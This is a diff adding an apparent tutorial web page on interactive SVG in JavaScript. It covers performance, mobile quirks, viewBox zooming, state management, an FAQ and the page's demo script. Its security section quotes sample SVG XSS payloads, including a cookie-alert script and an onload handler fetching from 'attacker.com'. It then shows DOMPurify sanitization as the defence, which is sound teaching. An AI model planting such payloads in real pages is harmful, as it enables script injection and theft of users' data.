+                <th>Anti-Pattern / Inefficient Practice</th>
+                <th>Architectural Consequence</th>
+                <th>Recommended Engineering Remedy</th>
+              </tr>
+            </thead>
+            <tbody>
+              <tr>
+                <td>Directly mutating <code>d</code>, <code>x</code>, or <code>cx</code> in tight loops</td>
+                <td>Forces full CPU path re-tessellation on every frame</td>
+                <td>Apply <code>transform: translate3d()</code> or SVG <code>transform</code> matrices</td>
+              </tr>
+              <tr>
+                <td>Active <code>wheel</code> or <code>touchmove</code> listeners without passive flag</td>
+                <td>Blocks browser thread compositor scrolling</td>
+                <td>Declare <code>{ passive: true }</code> on listeners unless calling <code>preventDefault()</code></td>
+              </tr>
+              <tr>
+                <td>Unbatched layout queries (<code>getBBox()</code>, <code>getScreenCTM()</code>)</td>
+                <td>Forces immediate synchronous layout recalculation (Layout Thrashing)</td>
+                <td>Cache static matrix measurements outside animation frame callbacks</td>
+              </tr>
+              <tr>
+                <td>Attaching thousands of individual event listeners</td>
+                <td>Massive memory consumption and slow DOM teardown</td>
+                <td>Implement a centralized Event Delegation pattern on the root SVG</td>
+              </tr>
+            </tbody>
+          </table>
+        </div>
+
+        <div class="warning-box">
+          <h4>Warning: Avoid Frequent getBBox() Calls Inside requestAnimationFrame</h4>
+          <p>The <code>element.getBBox()</code> method is computationally expensive because it forces the browser engine to compute the tight axis-aligned bounding box across Bezier curves and stroke geometries. Querying <code>getBBox()</code> repeatedly during pointer movement can drop framerates from 60fps to 12fps. Cache bounding box dimensions once during component mounting and only recompute when geometry actually updates.</p>
+        </div>
+      </section>
+
+      <section id="browser-compatibility-mobile">
+        <h2>10. Mobile Touch Gestures and Cross-Browser Rendering Quirks</h2>
+        <p>Delivering interactive SVG experiences across mobile platforms (iOS Mobile Safari, Android Chrome, and Samsung Internet) introduces specific platform idiosyncrasies:</p>
+
+        <ul>
+          <li><strong>touch-action: none:</strong> Mobile browsers intercept single-touch drags to scroll the document. You must declare <code>touch-action: none;</code> on your interactive SVG container via CSS, or pointer drag sequences will abort abruptly with a <code>pointercancel</code> event.</li>
+          <li><strong>WebKit Subpixel Matrix Rounding:</strong> Safari can occasionally render hairline visual seams when scaling SVGs via CSS transforms. Applying <code>shape-rendering="geometricPrecision"</code> to the root SVG instructs the WebKit rasterizer to use higher-precision antialiasing buffers.</li>
+          <li><strong>iOS Tap Delay &amp; Synthetic Click Suppression:</strong> By standardizing on native Pointer Events (<code>pointerdown</code>, <code>pointerup</code>) rather than legacy <code>touchstart</code> / <code>touchend</code> or click listeners, touch events respond with instantaneous 0ms latency without double-tap delay issues.</li>
+        </ul>
+      </section>
+
+      
+      <section id="interactive-maps-dataviz">
+        <h2>11. Case Study: Interactive SVG Maps and Data Visualizations</h2>
+        <p>A premier application of interactive SVG in production frontend engineering is building interactive geographic maps, seat selectors, and architectural schematics. In these applications, each region, country, or seat is represented by a separate <code>&lt;path&gt;</code> element with an arbitrary polygon or Bezier curve boundary.</p>
+
+        <h3>Zooming into Selected Vector Regions</h3>
+        <p>When a user clicks on an individual vector territory, a common UI requirement is to smoothly animate the SVG viewport so that the clicked element fills the frame. This requires calculating the element's exact bounding box in SVG user units using <code>element.getBBox()</code> and interpolating the root <code>viewBox</code> parameters:</p>
+
+        <pre><code class="language-javascript">/**
+ * Smoothly animates the SVG viewBox to zoom and center on a specific target element.
+ * @param {SVGSVGElement} svg - Root SVG container
+ * @param {SVGGraphicsElement} targetElement - Clicked path or shape
+ * @param {number} padding - Extra breathing room around the element in SVG units
+ * @param {number} durationMs - Animation duration in milliseconds
+ */
+function zoomToElement(svg, targetElement, padding = 20, durationMs = 600) {
+  // Query element bounding box in SVG user coordinate space
+  const bbox = targetElement.getBBox();
+
+  // Calculate target viewBox boundaries with padding
+  const targetX = bbox.x - padding;
+  const targetY = bbox.y - padding;
+  const targetWidth = bbox.width + (padding * 2);
+  const targetHeight = bbox.height + (padding * 2);
+
+  // Extract current viewBox parameters
+  const currentViewBox = svg.viewBox.baseVal;
+  const startX = currentViewBox.x;
+  const startY = currentViewBox.y;
+  const startWidth = currentViewBox.width;
+  const startHeight = currentViewBox.height;
+
+  const startTime = performance.now();
+
+  function animateFrame(now) {
+    const elapsed = now - startTime;
+    const progress = Math.min(elapsed / durationMs, 1);
+    // Cubic ease out transition
+    const ease = 1 - Math.pow(1 - progress, 3);
+
+    const curX = startX + (targetX - startX) * ease;
+    const curY = startY + (targetY - startY) * ease;
+    const curW = startWidth + (targetWidth - startWidth) * ease;
+    const curH = startHeight + (targetHeight - startHeight) * ease;
+
+    svg.setAttribute('viewBox', `${curX.toFixed(2)} ${curY.toFixed(2)} ${curW.toFixed(2)} ${curH.toFixed(2)}`);
+
+    if (progress < 1) {
+      requestAnimationFrame(animateFrame);
+    }
+  }
+
+  requestAnimationFrame(animateFrame);
+}</code></pre>
+      </section>
+
+      <section id="state-management-integration">
+        <h2>12. State Management Architecture: Decoupling Vector Nodes from Business Logic</h2>
+        <p>In enterprise-grade single-page applications built with React, Vue, Svelte, or Angular, directly mutating SVG DOM attributes inside raw event callbacks creates tight coupling and state synchronization bugs. A superior architectural approach is the <strong>Decoupled Event Bus / Reactive Signal Pattern</strong>.</p>
+
+        <p>The SVG DOM acts strictly as a presentation and input capture layer. User pointer interactions dispatch semantic domain events into a centralized state machine (such as Zustand, Redux Toolkit, or Preact Signals). The application state updates immutably, and reactive component bindings re-render or update only the affected SVG presentation attributes:</p>
+
+        <pre><code class="language-typescript">// TypeScript State Integration Architecture
+type NodeStatus = 'idle' | 'hovered' | 'selected' | 'dragging';
+
+interface VectorNodeState {
+  id: string;
+  x: number;
+  y: number;
+  status: NodeStatus;
+  label: string;
+}
+
+class VectorCanvasStore {
+  private nodes = new Map<string, VectorNodeState>();
+  private listeners = new Set<(nodes: VectorNodeState[]) => void>();
+
+  public updateNodePosition(id: string, x: number, y: number): void {
+    const node = this.nodes.get(id);
+    if (!node) return;
+
+    node.x = x;
+    node.y = y;
+    this.notify();
+  }
+
+  public setNodeStatus(id: string, status: NodeStatus): void {
+    const node = this.nodes.get(id);
+    if (!node || node.status === status) return;
+
+    node.status = status;
+    this.notify();
+  }
+
+  public subscribe(listener: (nodes: VectorNodeState[]) => void): () => void {
+    this.listeners.add(listener);
+    return () => this.listeners.delete(listener);
+  }
+
+  private notify(): void {
+    const snapshot = Array.from(this.nodes.values());
+    this.listeners.forEach(fn => fn(snapshot));
+  }
+}</code></pre>
+      </section>
+
+      <section id="security-xss-sanitization">
+        <h2>13. SVG Scripting Security: Sanitizing Dynamic and User-Uploaded Vectors</h2>
+        <p>Because inline SVG is fully parsed as active DOM elements, it represents a substantial Cross-Site Scripting (XSS) attack vector if user-uploaded SVG files are injected directly into HTML documents. Malicious actors can embed executable JavaScript inside SVG files through several distinct vectors:</p>
+
+        <ul>
+          <li><strong>Inline Script Elements:</strong> <code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code> inside the SVG XML payload.</li>
+          <li><strong>Event Handler Attributes:</strong> Attributes such as <code>onload</code>, <code>onclick</code>, <code>onmouseover</code>, or <code>onerror</code> declared on SVG tags like <code>&lt;svg onload="fetch('//attacker.com')"&gt;</code>.</li>
+          <li><strong>Hyperlink XSS:</strong> <code>&lt;a href="javascript:void(0)"&gt;</code> wrapped around vector shapes.</li>
+          <li><strong>Foreign Object Injections:</strong> Embedding arbitrary HTML5 execution contexts via <code>&lt;foreignObject&gt;</code>.</li>
+        </ul>
+
+        <div class="warning-box">
+          <h4>Critical Security Doctrine: Never Use innerHTML with Untrusted SVGs</h4>
+          <p>Never inject raw SVG strings using <code>element.innerHTML = untrustedSvgString</code> without comprehensive sanitization. Always pass untrusted vector files through a rigorous, updated security filter such as DOMPurify configured with strict SVG namespace and attribute allowlists.</p>
+        </div>
+
+        <pre><code class="language-javascript">// Secure Dynamic SVG Ingestion Pipeline
+import DOMPurify from 'dompurify';
+
+function renderSafeInteractiveSvg(container, rawSvgString) {
+  // Configure DOMPurify to allow standard interactive SVG attributes while purging scripts
+  const cleanSvgString = DOMPurify.sanitize(rawSvgString, {
+    USE_PROFILES: { svg: true, svgFilters: true },
+    ADD_ATTR: ['data-id', 'data-tooltip', 'tabindex', 'role', 'aria-label', 'transform'],
+    FORBID_TAGS: ['script', 'iframe', 'object'],
+    FORBID_ATTR: ['onload', 'onerror', 'onclick', 'onpointerdown']
+  });
+
+  // Inject sanitized markup safely
+  container.innerHTML = cleanSvgString;
+
+  // Re-bind verified, safe application event listeners programmatically
+  const interactivePaths = container.querySelectorAll('[data-id]');
+  interactivePaths.forEach(path => {
+    path.addEventListener('pointerdown', onSafePointerDown);
+  });
+}</code></pre>
+      </section>
+
+      <section id="frequently-asked-questions">
+        <h2>14. Frequently Asked Questions Regarding Interactive SVG with JavaScript</h2>
+        <div class="faq-item">
+          <h3>Why do standard MouseEvent clientX and clientY fail when positioning elements inside an SVG?</h3>
+          <p>MouseEvent clientX and clientY report pixel coordinates relative to the browser client viewport. SVG elements, however, render inside an internal user coordinate space defined by the viewBox attribute and current scale factors. When an SVG is scaled, rotated, centered, or preserves aspect ratio, client pixels do not correspond 1:1 with SVG internal units. To convert screen pixels to exact SVG viewBox coordinates, developers must invert the SVG current transformation matrix using svgElement.getScreenCTM().inverse() and multiply it by a DOMPoint initialized with clientX and clientY.</p>
+        </div>
+        <div class="faq-item">
+          <h3>What is the modern replacement for svg.createSVGPoint() in modern web browsers?</h3>
+          <p>In modern browsers conforming to the SVG2 and Geometry Interfaces specifications, new DOMPoint(clientX, clientY) replaces the legacy document.createElementNS or svg.createSVGPoint() API. Calling point.matrixTransform(svg.getScreenCTM().inverse()) transforms the coordinates directly into the local SVG coordinate system across Chrome, Edge, Firefox, and Safari without deprecation warnings.</p>
+        </div>
+        <div class="faq-item">
+          <h3>How does pointer-events: visiblePainted differ from pointer-events: all in SVG?</h3>
+          <p>pointer-events: visiblePainted triggers hit-testing only on parts of an element that have an explicit fill or stroke painted and whose visibility property is not set to hidden. Conversely, pointer-events: all captures pointer hits across the entire geometric interior and stroke boundary regardless of whether fill or stroke are set to none, or visibility is set to hidden. This makes pointer-events: all ideal for creating invisible hit targets around delicate thin line icons.</p>
+        </div>
+        <div class="faq-item">
+          <h3>Can you attach JavaScript event listeners to an SVG loaded inside an &lt;img&gt; tag?</h3>
+          <p>No. When an SVG is embedded using an HTML &lt;img&gt; tag or a CSS background-image property, the browser loads the vector asset in a secure, isolated image document context where all script execution, external resource loading, and cross-document DOM manipulation are permanently disabled for security reasons. To bind JavaScript event listeners, you must embed the SVG inline in HTML, load it via an &lt;object&gt; element on the same domain, or fetch and inline the raw XML into the DOM.</p>
+        </div>
+        <div class="faq-item">
+          <h3>How do you make interactive SVG shapes accessible to keyboard users and screen readers?</h3>
+          <p>To make an interactive SVG element accessible, add tabindex="0" to allow keyboard focus, assign role="button" or role="link" depending on semantic intent, and provide an explicit aria-label or link an internal &lt;title&gt; element via aria-labelledby. Furthermore, listen for keydown events for Enter (key code 13) and Space (key code 32) in addition to pointer events, and ensure visual focus states are visible using CSS :focus-visible outlines.</p>
+        </div>
+        <div class="faq-item">
+          <h3>How do you prevent SVG dragging and gesture conflicts on mobile touchscreen devices?</h3>
+          <p>Apply the CSS property touch-action: none to the interactive SVG container to prevent default mobile browser gestures such as pinch-to-zoom and page scrolling. In JavaScript, utilize modern Pointer Events (pointerdown, pointermove, pointerup) instead of touch events, and invoke event.target.setPointerCapture(event.pointerId) upon pointerdown so that drag events continue tracking reliably even when the finger strays outside the SVG element boundaries.</p>
+        </div>
+      </section>
+
+    </main>
+
+    <aside class="article-sidebar">
+      <div class="sidebar-card">
+        <div class="sidebar-title">Table of Contents</div>
+        <nav class="toc-nav">
+          <ol>
+            <li><a href="#interactiveSvgStudio">Interactive Event Sandbox</a></li>
+            <li><a href="#svg-dom-architecture">1. SVG DOM vs Canvas Architecture</a></li>
+            <li><a href="#event-model-propagation">2. Event Lifecycle &amp; Delegation</a></li>
+            <li><a href="#pointer-events-hierarchy">3. pointer-events Property Rules</a></li>
+            <li><a href="#coordinate-transforms-ctm">4. Screen to viewBox Coordinates</a></li>
+            <li><a href="#drag-and-drop-implementation">5. Resilient Drag &amp; Drop</a></li>
+            <li><a href="#pan-and-zoom-controls">6. Pan &amp; Zoom Viewport Controls</a></li>
+            <li><a href="#dynamic-tooltips-boundaries">7. Dynamic Tooltips &amp; Bounds</a></li>
+            <li><a href="#accessibility-keyboard-aria">8. WCAG Accessibility &amp; Keyboard</a></li>
+            <li><a href="#performance-optimization">9. Performance &amp; Hardware Acceleration</a></li>
+            <li><a href="#browser-compatibility-mobile">10. Mobile Touch &amp; Quirks</a></li>
+            <li><a href="#interactive-maps-dataviz">11. Interactive Maps Case Study</a></li>
+            <li><a href="#state-management-integration">12. State Management Architecture</a></li>
+            <li><a href="#security-xss-sanitization">13. SVG Security &amp; XSS Sanitization</a></li>
+            <li><a href="#frequently-asked-questions">14. Frequently Asked Questions</a></li>
+          </ol>
+        </nav>
+      </div>
+
+      <div class="cta-sidebar-box">
+        <h4>134K+ Free SVG Icons</h4>
+        <p>Explore, customize, and export pixel-perfect, interactive open-source SVG icons with zero login on IconStash.</p>
+        <a href="/#/" class="cta-sidebar-btn">Search Icon Library</a>
+      </div>
+    </aside>
+  </div>
+</div>
+
+<footer class="site-footer">
+  <p>&copy; 2026 <a href="/">IconStash</a>. Engineered by <a href="https://greatsoftwarecompany.com">Great Software Company</a>. All 134,701 vector icons curated from open-source libraries.</p>
+</footer>
+
+<script>
+  // Theme Persistence & Toggle
+  (function() {
+    var theme = localStorage.getItem('theme') || 'dark';
+    document.documentElement.setAttribute('data-theme', theme);
+    var btn = document.getElementById('themeToggle');
+    if (btn) {
+      btn.addEventListener('click', function() {
+        var current = document.documentElement.getAttribute('data-theme');
+        var next = current === 'dark' ? 'light' : 'dark';
+        document.documentElement.setAttribute('data-theme', next);
+        localStorage.setItem('theme', next);
+      });
+    }
+  })();
+
+  // Interactive Studio Logic
+  (function() {
+    const stageSvg = document.getElementById('stageSvg');
+    const stageBox = document.getElementById('stageViewportBox');
+    const demoDraggable = document.getElementById('demoDraggable');
+    const demoClickTarget = document.getElementById('demoClickTarget');
+    const demoStar = document.getElementById('demoStar');
+    const trackPoint = document.getElementById('trackPoint');
+    const pointerEventsSelect = document.getElementById('pointerEventsSelect');
+    const shapeSelect = document.getElementById('shapeSelect');
+    const clientCoordsVal = document.getElementById('clientCoordsVal');
+    const svgCoordsVal = document.getElementById('svgCoordsVal');
+    const ctmScaleVal = document.getElementById('ctmScaleVal');
+    const eventLogArea = document.getElementById('eventLogArea');
+    const clearLogBtn = document.getElementById('clearLogBtn');
+    const interactiveCodeOutput = document.getElementById('interactiveCodeOutput');
+    const copyInteractiveCodeBtn = document.getElementById('copyInteractiveCodeBtn');
+    const clickCountLabel = document.getElementById('clickCountLabel');
+    const modeButtons = document.querySelectorAll('#studioModes button');
+    const codeTabButtons = document.querySelectorAll('.code-tab-btn');
+
+    let currentMode = 'drag';
+    let currentCodeTab = 'vanilla';
+    let clickCount = 0;
+    let isDragging = false;
+    let dragOffset = { x: 0, y: 0 };
+    let dragPos = { x: 110, y: 140 };
+
+    function logEvent(type, targetName, coords) {
+      if (!eventLogArea) return;
+      const d = new Date();
+      const timeStr = `${d.getHours().toString().padStart(2,'0')}:${d.getMinutes().toString().padStart(2,'0')}:${d.getSeconds().toString().padStart(2,'0')}.${d.getMilliseconds().toString().padStart(3,'0')}`;
+      const line = document.createElement('div');
+      line.className = 'log-line';
+      line.innerHTML = `<span class="log-time">[${timeStr}]</span> <span class="log-type">${type}</span> <span class="log-target">${targetName}</span> <span class="log-coords">(${coords})</span>`;
+      eventLogArea.prepend(line);
+      // Keep max 25 entries
+      while (eventLogArea.children.length > 25) {
+        eventLogArea.removeChild(eventLogArea.lastChild);
+      }
+    }
+
+    if (clearLogBtn) {
+      clearLogBtn.addEventListener('click', () => {
+        eventLogArea.innerHTML = '<div class="log-line"><span class="log-time">[Cleared]</span> <span class="log-type">System</span>: Event log reset.</div>';
+      });
+    }
+
+    function getTransformedCoordinates(clientX, clientY) {
+      const ctm = stageSvg.getScreenCTM();
+      if (!ctm) return { x: 0, y: 0, scaleX: 1, scaleY: 1 };
+      const point = new DOMPoint(clientX, clientY);
+      const transformed = point.matrixTransform(ctm.inverse());
+      return {
+        x: transformed.x,
+        y: transformed.y,
+        scaleX: ctm.a,
+        scaleY: ctm.d
+      };
+    }
+
+    function updateStudio() {
+      // Apply pointer-events rule to interactive elements
+      const pe = pointerEventsSelect.value;
+      demoDraggable.style.pointerEvents = pe;
+      demoClickTarget.style.pointerEvents = pe;
+      demoStar.style.pointerEvents = pe;
+
+      renderCodeSnippet();
+    }
+
+    function renderCodeSnippet() {
+      const pe = pointerEventsSelect.value;
+      if (currentCodeTab === 'vanilla') {
+        interactiveCodeOutput.textContent =
+`// Production Vanilla JavaScript: Screen-to-ViewBox Transformer & Drag Handler
+const svg = document.querySelector('#stageSvg');
+const draggableNode = document.querySelector('#demoDraggable');
+
+function getSvgCoords(clientX, clientY) {
+  const ctm = svg.getScreenCTM();
+  const pt = new DOMPoint(clientX, clientY);
+  return pt.matrixTransform(ctm.inverse());
+}
+
+let isDragging = false;
+let offset = { x: 0, y: 0 };
+let currentPosition = { x: ${dragPos.x.toFixed(1)}, y: ${dragPos.y.toFixed(1)} };
+
+draggableNode.style.pointerEvents = '${pe}';
+
+draggableNode.addEventListener('pointerdown', (e) => {
+  if (e.button !== 0) return;
+  isDragging = true;
+  draggableNode.setPointerCapture(e.pointerId);
+  const coords = getSvgCoords(e.clientX, e.clientY);
+  offset.x = coords.x - currentPosition.x;
+  offset.y = coords.y - currentPosition.y;
+});
+
+draggableNode.addEventListener('pointermove', (e) => {
+  if (!isDragging) return;
+  const coords = getSvgCoords(e.clientX, e.clientY);
+  currentPosition.x = coords.x - offset.x;
+  currentPosition.y = coords.y - offset.y;
+  draggableNode.setAttribute('transform', \`translate(\${currentPosition.x}, \${currentPosition.y})\`);
+});
+
+draggableNode.addEventListener('pointerup', (e) => {
+  if (!isDragging) return;
+  isDragging = false;
+  draggableNode.releasePointerCapture(e.pointerId);
+});`;
+      } else if (currentCodeTab === 'ts') {
+        interactiveCodeOutput.textContent =
+`// TypeScript 5: Scalable Vector Interaction Engine
+interface VectorPoint { x: number; y: number; }
+
+export class SvgInteractionEngine {
+  private svg: SVGSVGElement;
+  private node: SVGGElement;
+  private isDragging = false;
+  private offset: VectorPoint = { x: 0, y: 0 };
+  private position: VectorPoint = { x: ${dragPos.x.toFixed(1)}, y: ${dragPos.y.toFixed(1)} };
+
+  constructor(svgElement: SVGSVGElement, nodeElement: SVGGElement) {
+    this.svg = svgElement;
+    this.node = nodeElement;
+    this.node.style.pointerEvents = '${pe}';
+    this.bindEvents();
+  }
+
+  public getCoordinates(clientX: number, clientY: number): VectorPoint {
+    const ctm = this.svg.getScreenCTM();
+    if (!ctm) return { x: 0, y: 0 };
+    const pt = new DOMPoint(clientX, clientY);
+    const transformed = pt.matrixTransform(ctm.inverse());
+    return { x: transformed.x, y: transformed.y };
+  }
+
+  private bindEvents(): void {
+    this.node.addEventListener('pointerdown', (e: PointerEvent) => {
+      this.isDragging = true;
+      this.node.setPointerCapture(e.pointerId);
+      const coords = this.getCoordinates(e.clientX, e.clientY);
+      this.offset.x = coords.x - this.position.x;
+      this.offset.y = coords.y - this.position.y;
+    });
+
+    this.node.addEventListener('pointermove', (e: PointerEvent) => {
+      if (!this.isDragging) return;
+      const coords = this.getCoordinates(e.clientX, e.clientY);
+      this.position.x = coords.x - this.offset.x;
+      this.position.y = coords.y - this.offset.y;
+      this.node.setAttribute('transform', \`translate(\${this.position.x}, \${this.position.y})\`);
+    });
+
+    this.node.addEventListener('pointerup', (e: PointerEvent) => {
+      this.isDragging = false;
+      this.node.releasePointerCapture(e.pointerId);
+    });
+  }
+}`;
+      } else if (currentCodeTab === 'react') {
+        interactiveCodeOutput.textContent =
+`// React 19 / Next.js Pointer Transform Hook
+import React, { useRef, useState, useCallback } from 'react';
+
+export function useSvgCoordinates(svgRef: React.RefObject<SVGSVGElement | null>) {
+  const getCoordinates = useCallback((e: React.PointerEvent) => {
+    if (!svgRef.current) return { x: 0, y: 0 };
+    const ctm = svgRef.current.getScreenCTM();
+    if (!ctm) return { x: 0, y: 0 };
+    const point = new DOMPoint(e.clientX, e.clientY);
+    const res = point.matrixTransform(ctm.inverse());
+    return { x: res.x, y: res.y };
+  }, [svgRef]);
+
+  return { getCoordinates };
+}
+
+export const InteractiveSvgComponent = () => {
+  const svgRef = useRef<SVGSVGElement>(null);
+  const { getCoordinates } = useSvgCoordinates(svgRef);
+  const [pos, setPos] = useState({ x: ${dragPos.x.toFixed(1)}, y: ${dragPos.y.toFixed(1)} });
+
+  return (
+    <svg ref={svgRef} viewBox="0 0 500 320" style={{ pointerEvents: '${pe}' }}>
+      <g transform={\`translate(\${pos.x}, \${pos.y})\`} role="button" tabIndex={0}>
+        <polygon points="0,-45 39,-22 39,22 0,45 -39,22 -39,-22" fill="#181E07" stroke="#C1DD2D" strokeWidth={3} />
+      </g>
+    </svg>
+  );
+};`;
+      }
+    }
+
+    // Pointer movement tracking
+    stageBox.addEventListener('pointermove', (e) => {
+      const coords = getTransformedCoordinates(e.clientX, e.clientY);
+      clientCoordsVal.textContent = `X: ${e.clientX}, Y: ${e.clientY}`;
+      svgCoordsVal.textContent = `X: ${coords.x.toFixed(1)}, Y: ${coords.y.toFixed(1)}`;
+      ctmScaleVal.textContent = `${coords.scaleX.toFixed(3)} × ${coords.scaleY.toFixed(3)}`;
+
+      trackPoint.setAttribute('cx', coords.x.toFixed(1));
+      trackPoint.setAttribute('cy', coords.y.toFixed(1));
+
+      if (isDragging) {
+        dragPos.x = coords.x - dragOffset.x;
+        dragPos.y = coords.y - dragOffset.y;
+        demoDraggable.setAttribute('transform', `translate(${dragPos.x.toFixed(1)}, ${dragPos.y.toFixed(1)})`);
+        renderCodeSnippet();
+      }
+    });
+
+    // Drag events on demoDraggable
+    demoDraggable.addEventListener('pointerdown', (e) => {
+      if (currentMode !== 'drag' && currentMode !== 'inspect') return;
+      if (e.button !== 0) return;
+      isDragging = true;
+      demoDraggable.setPointerCapture(e.pointerId);
+      const coords = getTransformedCoordinates(e.clientX, e.clientY);
+      dragOffset.x = coords.x - dragPos.x;
+      dragOffset.y = coords.y - dragPos.y;
+      logEvent('pointerdown', '&lt;g #demoDraggable&gt;', `${coords.x.toFixed(0)}, ${coords.y.toFixed(0)}`);
+    });
+
+    demoDraggable.addEventListener('pointerup', (e) => {
+      if (!isDragging) return;
+      isDragging = false;
+      demoDraggable.releasePointerCapture(e.pointerId);
+      const coords = getTransformedCoordinates(e.clientX, e.clientY);
+      logEvent('pointerup', '&lt;g #demoDraggable&gt;', `${coords.x.toFixed(0)}, ${coords.y.toFixed(0)}`);
+    });
+
+    // Click target
+    demoClickTarget.addEventListener('click', (e) => {
+      clickCount++;
+      clickCountLabel.textContent = `Clicks: ${clickCount}`;
+      const shape = document.getElementById('clickShape');
+      shape.setAttribute('stroke', clickCount % 2 === 1 ? '#C1DD2D' : '#333');
+      const coords = getTransformedCoordinates(e.clientX, e.clientY);
+      logEvent('click', '&lt;g #demoClickTarget&gt;', `${coords.x.toFixed(0)}, ${coords.y.toFixed(0)}`);
+    });
+
+    // Star hover
+    demoStar.addEventListener('pointerenter', (e) => {
+      const shape = document.getElementById('starShape');
+      shape.setAttribute('fill', 'rgba(193,221,45,0.4)');
+      shape.setAttribute('stroke', '#C1DD2D');
+      const coords = getTransformedCoordinates(e.clientX, e.clientY);
+      logEvent('pointerenter', '&lt;g #demoStar&gt;', `${coords.x.toFixed(0)}, ${coords.y.toFixed(0)}`);
+    });
+
+    demoStar.addEventListener('pointerleave', (e) => {
+      const shape = document.getElementById('starShape');
+      shape.setAttribute('fill', 'rgba(96,165,250,0.15)');
+      shape.setAttribute('stroke', '#60A5FA');
+      const coords = getTransformedCoordinates(e.clientX, e.clientY);
+      logEvent('pointerleave', '&lt;g #demoStar&gt;', `${coords.x.toFixed(0)}, ${coords.y.toFixed(0)}`);
+    });
+
+    // Mode toggles
+    modeButtons.forEach(btn => {
+      btn.addEventListener('click', () => {
+        modeButtons.forEach(b => b.classList.remove('active'));
+        btn.classList.add('active');
+        currentMode = btn.getAttribute('data-mode');
+        logEvent('modechange', `Mode: ${currentMode}`, 'System');
+      });
+    });
+
+    // Code tabs
+    codeTabButtons.forEach(tab => {
+      tab.addEventListener('click', () => {
+        codeTabButtons.forEach(t => t.classList.remove('active'));
+        tab.classList.add('active');
+        currentCodeTab = tab.getAttribute('data-tab');
+        renderCodeSnippet();
+      });
+    });
+
+    pointerEventsSelect.addEventListener('change', () => {
+      logEvent('change', `pointer-events: ${pointerEventsSelect.value}`, 'CSS Property');
+      updateStudio();
+    });
+
+    if (copyInteractiveCodeBtn) {
+      copyInteractiveCodeBtn.addEventListener('click', () => {
+        navigator.clipboard.writeText(interactiveCodeOutput.textContent).then(() => {
+          copyInteractiveCodeBtn.textContent = 'Copied!';
+          setTimeout(() => { copyInteractiveCodeBtn.textContent = 'Copy Snippet'; }, 2000);
+        }).catch(() => {
+          copyInteractiveCodeBtn.textContent = 'Failed to copy';
+        });
+      });
+    }
+
+    updateStudio();
+  })();
+</script>
+
+</body>
+</html>
